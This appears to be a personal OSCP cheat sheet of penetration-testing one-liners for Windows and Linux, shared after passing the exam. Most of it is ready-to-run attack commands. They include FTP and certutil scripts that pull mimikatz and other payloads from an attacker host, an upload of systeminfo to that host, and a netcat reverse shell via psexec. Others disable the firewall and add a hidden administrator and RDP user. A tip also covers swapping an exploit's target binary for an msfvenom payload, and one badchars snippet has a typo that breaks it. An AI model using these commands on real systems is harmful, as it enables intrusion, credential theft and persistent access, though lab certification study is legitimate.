# I have passed OSCP as of today.  
  
## Useful tips:  
  
Hosting files in Kali:  
1) go to folder where to host files  
2) python -m SimpleHTTPServer 80  
  
If in case your script shows ^M errors in linux, and need to remove dos CRs:  
```  
dos2unix <your script file>  
```  
  
Pivoting:  
```  
sshuttle -r user@ipdaddr iprange  
```  
  
Example:  
```  
sshuttle -r user@10.49.49.49 10.50.50.0/24  
```  
  
Building an array for badchars:  
```  
badchararray = [chr(i) for I in range(0, 0x100)]  
badchars = "".join(badchararray)  
"".join(badchars)  
```  
  
Building an array for badchars except certain values:  
```  
badchararray = [chr(i) for I in range(0, 0x100) if i not in [0x00, 0x01]]  
badchars = "".join(badchararray)  
"".join(badchars)  
```  
  
Best recon tool:  
https://github.com/Tib3rius/AutoRecon  
  
Best cheat sheet for reverse shells:  
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet  

Best cheat sheet for post exploitation without a tty:
http://pentestmonkey.net/blog/post-exploitation-without-a-tty
  

## windows  
  
Proof:  
```  
echo hostname: & hostname & echo username: & whoami & echo proof & type proof.txt & ipconfig /all  
```  
  
Downloading files without using powershell/vbs:  
```  
certutil -urlcache -split -f http://yourkaliiphere/file.exe c:\file.exe  
```  
  
Run systeminfo and upload to my box:  
```  
systeminfo > %computername%.systeminfo & echo open %myhost% > ftp.txt & echo user myuser 12345 >> ftp.txt & echo bin >> ftp.txt & echo put %computername%.systeminfo >> ftp.txt & echo bye >> ftp.txt & ftp -v -n -s:ftp.txt  
```  
  
Post Exploitation:  
  
Add user in admin & rdp group:  
```  
net user myuser 12345 /add & net localgroup administrators myuser /add & net localgroup "Remote Desktop Users" myuser /add  
```  
  
Enable RDP:  
```  
netsh firewall set opmode mode=DISABLE & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & sc start termservice  
```  
  
Start RDesktop:  
```  
net start termservice  
```  
  
One liner post exploitation (add user, enable rdp):  
```  
netsh firewall set opmode mode=DISABLE & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & sc start termservice & net user myuser 12345 /add & net localgroup administrators myuser /add & net localgroup "Remote Desktop Users" myuser /add  
```  
  
One liner download and run mimikatz:  
```  
echo open %ipaddr% > ftp.txt & echo user myuser 12345 >> ftp.txt & echo bin >> ftp.txt & echo get x64/mimidrv.sys >> ftp.txt &echo get x64/mimikatz.exe >> ftp.txt &echo get x64/mimilib.dll >> ftp.txt &echo get x64/mimilove.exe >> ftp.txt & echo bye >> ftp.txt & ftp -v -n -s:ftp.txt   
```  
  
One liner download and run windows credential editor:  
```  
echo open %ipaddr% > ftp.txt & echo user myuser 12345 >> ftp.txt & echo bin >> ftp.txt & echo get wceu.exe >> ftp.txt & echo bye >> ftp.txt & ftp -v -n -s:ftp.txt   
```  
  
Run psexec as another user:  
```  
psexec64 -accepteula -u %username% -p %password% nc %ipaddr% %port% -e cmd.exe  
```  
  
For privesc PoCs which run "calc.exe" or "cmd.exe" using CreateProcess(), CREATE_NEW_WINDOW, change target binary to a msfvenom payload.  
  
e.g.  
https://github.com/abatchy17/WindowsExploits/blob/master/MS10-015%20-%20KiTrap0D/vdmallowed.c  
Instead of:  
```  
    if (PrepareProcessForSystemToken("C:\\WINDOWS\\SYSTEM32\\CMD.EXE", &ShellPid) != TRUE) {  
        LogMessage(L_ERROR, "PrepareProcessForSystemToken() returned failure");  
        goto finished;  
    }  
```  
Use:  
```  
    if (PrepareProcessForSystemToken("C:\\WINDOWS\\TEMP\\PAYLOAD.EXE", &ShellPid) != TRUE) {  
        LogMessage(L_ERROR, "PrepareProcessForSystemToken() returned failure");  
        goto finished;  
    }  
```  
  
Cracking fgdump hashes:  
```  
john --wordlist=/ftphome/rockyou.txt fgdump.txt  
```  
  
## linux  
  
Proof:  
```  
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat proof.txt 2>/dev/null;echo " "  
```  
  
Interactive shell:  
```  
python -c 'import pty; pty.spawn("/bin/bash")'  
```  
  
Best Linux PrivEsc tool:  
https://github.com/rebootuser/LinEnum  
  
  
## others

Good luck! (and try harder!)  
